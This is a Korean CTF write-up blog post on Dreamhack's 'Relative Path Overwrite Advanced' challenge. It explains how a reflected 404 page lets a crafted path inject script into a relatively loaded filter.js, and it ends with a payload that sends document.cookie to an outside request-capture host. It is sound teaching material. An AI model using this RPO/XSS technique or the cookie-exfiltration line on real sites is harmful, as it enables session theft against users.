---
title: (36) Dreamhack Relative Path Overwrite Advanced 문제 풀이
date: 2024-02-13 +09:00
categories:
  - 웹해킹
tags:
  - [웹해킹, 드림핵]
---
{% raw %}
## 문제 풀이
이 문제는 전에 올렸던 Dreamhack Relative Path Overwrite의 업그레이드 문제입니다.  
사이트는 저번과 똑같은데 404 페이지가 추가 되었습니다.
![](https://kyuyeop.github.io/assets/img/post/36/1.png)
존재하지 않는 페이지에 접속을 시도하면 위와 같이 `{입력한 url} not found.`가 보여집니다. 404 페이지의 코드는 다음과 같습니다.
```php
<?php 
    header("HTTP/1.1 200 OK");
    echo $_SERVER["REQUEST_URI"] . " not found."; 
?>
```
입력한 uri를 반환하는 굉장히 정직한 코드입니다.  
  
추가로 vuln 페이지의 코드도 살짝 바뀌었습니다.
```php
<script src="filter.js"></script>
<pre id=param></pre>
<script>
    var param_elem = document.getElementById("param");
    var url = new URL(window.location.href);
    var param = url.searchParams.get("param");
    if (typeof filter === 'undefined') {
        param = "nope !!";
    }
    else {
        for (var i = 0; i < filter.length; i++) {
            if (param.toLowerCase().includes(filter[i])) {
                param = "nope !!";
                break;
            }
        }
    }

    param_elem.innerHTML = param;
</script>
```
이제는 `filter`만 없어도 `nope!!`이 나와버립니다.
![](https://kyuyeop.github.io/assets/img/post/36/2.png)
`filter.js`의 위치도 `static`폴더 내부로 옮겨 져서 `filter.js`가 기본적으로 불러와지지 않는 모습입니다.  
  
여기서 취약점이 발생합니다. 개발자도구로 `filter.js`를 열어보면
![](https://kyuyeop.github.io/assets/img/post/36/3.png)
`/filter.js`가 존재하지 않는 페이지라서 404페이지의 내용이 들어간 모습입니다.
  
만약 `filter.js`가 불러와질 경로에 스크립트를 포함 시킬 수 있다면 어떨까요?
```
/index.php/;alert(0);//?page=vuln
```
위와 같은 경로로 접속하게 된다면 서버는 index.php를 통해 vuln 페이지를 보여줄거고, filter.js의 내용은
![](https://kyuyeop.github.io/assets/img/post/36/4.png)
위와 같이 바뀌어 버립니다. 앞은 `;`로 우리가 필요한 스크립트에 영향을 못 주게 하고, 뒷부분은 `//`로 주석처리 해버립니다.
![](https://kyuyeop.github.io/assets/img/post/36/5.png)
그러면 이렇게 alert이 실행되는걸 볼 수 있습니다.  
  
이제 다 해결한거나 다름 없습니다. 이전에 했던것 처럼 드림핵 툴즈를 이용해 flag를 빼와보도록 하겠습니다.
```
index.php/;location='https://ojxhcap.request.dreamhack.games/'+document.cookie;//?page=vuln
```
을 입력해 주도록 하겠습니다.    
  
그동안은 `?`로 넘겨주었지만 이번에 `?`를 이용하지 않고 `/`로 넘겨준 이유는 `?` 이후 문자열이 get파라미터로 인식되지 않기 위함이고, url encoding 과정이 없으므로 `%2b`가 아니라 `+`를 그대로 사용합니다.
![](https://kyuyeop.github.io/assets/img/post/36/6.png)
드림핵 툴즈로 돌아가서 기록을 확인해보면 flag를 얻을 수 있습니다.
{% endraw %}